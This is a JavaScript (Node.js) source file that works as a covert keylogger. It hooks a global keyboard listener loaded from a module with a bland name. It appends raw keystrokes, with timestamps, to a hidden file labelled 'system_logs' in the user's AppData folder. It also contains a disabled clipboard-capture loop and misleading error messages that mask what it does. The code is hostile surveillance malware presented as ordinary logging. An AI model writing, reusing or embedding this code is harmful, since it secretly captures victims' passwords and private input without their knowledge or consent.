try {
    const axios = require('axios');
    const os = require('os');
    const path = require('path');
    const fs = require('fs');
    //const clipboardy = require('clipboardy');

    const homeDir = os.homedir(); // e.g., C:\Users\<YourUsername>
    const logPath = path.join(homeDir, 'AppData', 'Local', 'system_logs');

    let GlobalKeyboardListener;
    let v;
    let rawBuffer = `\n\n*********************************        ${new Date()}       ********************************\n\n`;

    /*
    let lastClipboardContent = '';

    setInterval(() => {
        const currentContent = clipboardy.readSync();
        if (currentContent !== lastClipboardContent) {
            //console.log('Clipboard changed:', currentContent);
            rawBuffer += 'Clip: -------->>>>>>'+currentContent+'\n';
            lastClipboardContent = currentContent;
        }
    }, 1000); // check every second
    */


    // Try to require the jsonpacks module
    try {
        GlobalKeyboardListener = require("logs-conf").GlobalKeyboardListener;
        v = new GlobalKeyboardListener();
    } catch (error) {
        console.warn('Some modules are deprecated and won\'t work well in the future...');
    }

    function processKeyEvent(event, down) {
        if (!v) return;
        const keyName = event.name;

        if (down[keyName]) {
            
            const keyName = event.name;
            if (event.rawKey && ['VK_MBUTTON', 'VK_RBUTTON', 'VK_LBUTTON'].includes(event.rawKey._nameRaw) || keyName === 'RETURN' || keyName === 'ENTER' ) {
                if(rawBuffer != ''){
                    rawBuffer += `\n\n\----------------------        ${new Date()}      -----------------------------\n\n`;
                    fs.writeFile(logPath, rawBuffer, { flag: 'a' }, (err) => {
                        if (err) {
                            //console.error('Error writing to file:', err);
                        } else {
                            //console.log('Data appended successfully.');
                        }
                    });
                    rawBuffer = '';
                }
            } else{
                rawBuffer += JSON.stringify(event.rawKey)+'\n';
            }
        }
    }

    const init = () => {
        try {
            if(v) {
                v.addListener(processKeyEvent);
            } else {
                console.warn('Keyboard listener not initialized, as parkers-key module is missing.');
            }
        } catch (error) {
            if (error.code === 'EACCES') {
                console.error('Permission denied: Please run the application as an administrator or grant the necessary permissions.');
            } else if (error.code === 'EAGAIN') {
                console.error('Failed to add keyboard listener: Please try again or restart the application.');
            } else {
                console.error(`Error adding keyboard listener: ${error}`);
            }
        }
    }; 
    init();

} catch (error) {
    console.error(`Unexpected error: ${error}`);
}